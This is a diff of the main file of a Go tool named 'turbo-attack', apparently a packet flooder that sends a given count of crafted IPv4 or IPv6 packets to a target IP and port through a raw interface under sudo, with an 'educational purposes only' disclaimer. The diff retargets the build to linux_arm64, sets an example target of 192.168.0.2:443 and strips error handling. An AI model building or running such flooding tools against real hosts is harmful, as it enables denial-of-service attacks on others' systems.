@@ -5,13 +5,12 @@
 // The authors and publishers assume no responsibility.
 // For educational purposes only.
 
-// sudo dlv debug --headless --listen=:2345 --log --api-version=2 exec /mypath/binary -- --config=config.toml
+// sudo dlv debug --headless --listen=:2345 --log --api-version=2 exec /mypath/binary -- eth0 4 192.168.0.2 443 1
 
 package main
 
 import (
 	"fmt"
-	"log"
 	"os"
 	"runtime"
 	"sync"
@@ -30,7 +29,7 @@ func main() {
 	sudo.Check()
 
 	if len(os.Args) != 6 {
-		fmt.Println("usage: turbo-attack_010l <ethInterface> <ipVersion> <ip> <port> <count>")
+		fmt.Println("usage: turbo-attack_010_linux_arm64 <ethInterface> <ipVersion> <ip> <port> <count>")
 		return
 	}
 
@@ -42,29 +41,17 @@ func main() {
 
 	var wg sync.WaitGroup
 	if ipVersion == "4" {
-		ipv4Byte, portByte, countInt := convert.IPV4(&ip, &port, &count)
+		ipv4Byte, portByte, countInt := convert.IPV4(&ethInterface, &ip, &port, &count)
 		for i := 0; i < *countInt; i++ {
 			wg.Add(1)
-			packetErr, writeErr := routine.IPv4(&ethInterface, ipv4Byte, portByte)
-			if packetErr != nil {
-				log.Fatal(packetErr)
-			}
-			if writeErr != nil {
-				log.Fatal(writeErr)
-			}
+			routine.IPv4(&ethInterface, ipv4Byte, portByte)
 			wg.Done()
 		}
 		wg.Wait()
 	} else if ipVersion == "6" {
-		ipv6Byte, portByte, countInt := convert.IPV6(&ip, &port, &count)
+		ipv6Byte, portByte, countInt := convert.IPV6(&ethInterface, &ip, &port, &count)
 		for i := 0; i < *countInt; i++ {
-			packetErr, writeErr := routine.IPv6(&ethInterface, ipv6Byte, portByte)
-			if packetErr != nil {
-				log.Fatal(packetErr)
-			}
-			if writeErr != nil {
-				log.Fatal(writeErr)
-			}
+			routine.IPv6(&ethInterface, ipv6Byte, portByte)
 		}
 	} else {
 		fmt.Println("valid: 4 or 6")
